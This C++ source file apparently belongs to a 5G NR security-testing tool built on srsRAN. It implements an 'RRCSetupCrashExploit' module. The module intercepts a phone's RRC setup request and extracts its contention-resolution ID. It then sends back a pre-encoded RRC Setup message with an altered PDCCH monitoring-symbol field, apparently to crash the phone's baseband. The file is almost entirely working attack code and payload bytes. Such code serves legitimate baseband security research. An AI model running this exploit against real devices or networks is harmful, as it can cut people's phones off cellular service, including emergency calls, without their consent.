#include "shadower/hdr/exploit.h"
#include "shadower/hdr/utils.h"
#include "shadower/modules/hdr/rrc_setup_helper.h"
#include "srsran/asn1/asn1_utils.h"
#include "srsran/asn1/rrc_nr.h"
#include "srsran/mac/mac_sch_pdu_nr.h"
#include <iomanip>
#include <sstream>
const uint8_t original_rrc_setup[] = {
    0x3e, 0x11, 0xd7, 0x07, 0x07, 0x11, 0xd0, 0x40, 0x01, 0x3d, 0x20, 0x40, 0x04, 0x09, 0xc2, 0xe0, 0x05, 0x80, 0x08,
    0x8b, 0xd7, 0x63, 0x80, 0x83, 0x0f, 0x00, 0x03, 0xe0, 0x10, 0x23, 0x41, 0xe0, 0x40, 0x00, 0x20, 0x90, 0x4c, 0x0c,
    0xa8, 0x00, 0x0f, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x18, 0x37, 0x08, 0x42, 0x00, 0x01, 0x20, 0x08, 0x25, 0x00, 0x20,
    0xc0, 0x00, 0x00, 0x08, 0x1a, 0x63, 0x40, 0x22, 0x00, 0x20, 0x40, 0x01, 0xc7, 0x11, 0x08, 0x90, 0x00, 0x81, 0x00,
    0x07, 0x1c, 0x44, 0x42, 0x80, 0x02, 0x04, 0x00, 0x1c, 0x71, 0x11, 0x8c, 0x00, 0x08, 0x10, 0x00, 0x71, 0xc4, 0x80,
    0xc0, 0x11, 0x0d, 0x03, 0x55, 0x64, 0x84, 0x1c, 0x00, 0x10, 0x40, 0xc2, 0x05, 0x0c, 0x1c, 0x94, 0x48, 0xa1, 0x63,
    0x06, 0x8e, 0x1e, 0x00, 0x00, 0x10, 0xa0, 0x00, 0x10, 0x01, 0x6a, 0x00, 0x02, 0x00, 0x10, 0xa0, 0x20, 0x30, 0x01,
    0x6a, 0x02, 0x04, 0x00, 0x10, 0xa0, 0x40, 0x50, 0x01, 0x6a, 0x04, 0x06, 0x00, 0x10, 0xa0, 0x60, 0x70, 0x01, 0x6a,
    0x06, 0x08, 0x19, 0x10, 0xa0, 0x20, 0x90, 0x0a, 0x08, 0x02, 0x80, 0x28, 0x24, 0x0b, 0x00, 0xa0, 0xa0, 0x30, 0x02,
    0x82, 0xc0, 0xd0, 0x0a, 0x0c, 0x03, 0x80, 0x28, 0x34, 0x0f, 0x18, 0xa0, 0xd4, 0x09, 0x2c, 0x60, 0x50, 0xe2, 0x3a,
    0x2b, 0x3c, 0x4d, 0xe4, 0xd0, 0x3a, 0x41, 0x07, 0x8b, 0xbf, 0x03, 0x04, 0x38, 0x00, 0x00, 0x00, 0x71, 0xff, 0xa5,
    0x29, 0x4a, 0x52, 0x9e, 0x50, 0x2c, 0x00, 0x00, 0x43, 0x2e, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00,
    0x01, 0x8a, 0xd5, 0x45, 0x00, 0x47, 0x00, 0x18, 0x00, 0x08, 0x20, 0x00, 0xe2, 0x10, 0x05, 0xc4, 0x00, 0xe0, 0x20,
    0x21, 0x08, 0x00, 0x1c, 0x42, 0x00, 0xb8, 0x40, 0x1c, 0x08, 0x04, 0x41, 0x00, 0x03, 0x88, 0x40, 0x17, 0x08, 0x03,
    0x81, 0x80, 0x84, 0x20, 0x00, 0x71, 0x08, 0x02, 0xe1, 0x80, 0x70, 0x40, 0x11, 0x04, 0x00, 0x0e, 0x21, 0x00, 0x5c,
    0x30, 0x00, 0x80, 0x00, 0x00, 0x08, 0x21, 0x80, 0x81, 0x01, 0x82, 0x01, 0xc1, 0xa0, 0x00, 0x1c, 0x71, 0x00, 0x00,
    0x00, 0x08, 0x01, 0x00, 0x02, 0x01, 0x80, 0x02, 0x02, 0x40, 0x08, 0x80, 0x29, 0x80, 0x00, 0x08, 0xc4, 0x00, 0x79,
    0xc7, 0x00, 0x18, 0x00, 0x3f, 0x00, 0x00, 0x00, 0x00, 0x00};

class RRCSetupCrashExploit : public Exploit
{
public:
  RRCSetupCrashExploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                       SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    if (!prepare_rrc_setup()) {
      printf("Failed to prepare RRC setup\n");
    }
  }

  void setup() override
  {
    if (!prepare_rrc_setup()) {
      throw std::runtime_error("Failed to prepare RRC setup");
    }
    f_rrc_setup_request = wd_filter("nr-rrc.c1 == 0");
    f_ue_identity       = wd_field("nr-rrc.randomValue"); // nr-rrc.ue_Identity
  }

  void pre_dissection(wd_t* wd) override { wd_register_filter(wd, f_rrc_setup_request); }

  void post_dissection(wd_t*                 wd,
                       uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (direction == UL && wd_read_filter(wd, f_rrc_setup_request)) {
      if (!extract_con_res_id(raw_buffer, raw_buffer_len, con_res_id, logger)) {
        logger.info("Failed to extract con_res_id from UL message");
        return;
      }
      logger.info(YELLOW "Received RRC setup request" RESET);
      srsran::byte_buffer_t tx_buffer;
      if (!replace_con_res_id(original_rrc_setup_mac_pdu,
                              original_rrc_setup_len,
                              con_res_id,
                              tx_buffer,
                              logger,
                              &modified_dl_ccch_msg)) {
        logger.info("Failed to replace con_res_id");
        return;
      }
      rrc_setup_to_send = std::make_shared<std::vector<uint8_t> >(tx_buffer.size());
      dl_buffer_queue.push(rrc_setup_to_send);
      return;
    }
  }

private:
  wd_filter_t f_rrc_setup_request;
  wd_field_t  f_ue_identity;

  std::shared_ptr<std::vector<uint8_t> > rrc_setup_to_send;
  uint32_t                               original_rrc_setup_len;
  srsran::mac_sch_pdu_nr                 original_rrc_setup_mac_pdu;

  srsran::mac_sch_subpdu_nr::ue_con_res_id_t con_res_id;
  std::vector<uint8_t>                       modified_dl_ccch_msg;

  bool prepare_rrc_setup()
  {
    original_rrc_setup_len = sizeof(original_rrc_setup);
    /* Unpack RRC setup */
    if (original_rrc_setup_mac_pdu.unpack(original_rrc_setup, sizeof(original_rrc_setup))) {
      printf("Failed to unpack original RRC setup message\n");
      return false;
    }

    /* Check if modify the monitoring symbol works */
    if (!modify_monitoring_symbol_within_slot(original_rrc_setup_mac_pdu, "10000010110110", modified_dl_ccch_msg)) {
      printf("Failed to modify monitoring symbol\n");
      return false;
    }
    return true;
  }
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new RRCSetupCrashExploit(dl_buffer_queue_, ul_buffer_queue_);
}
}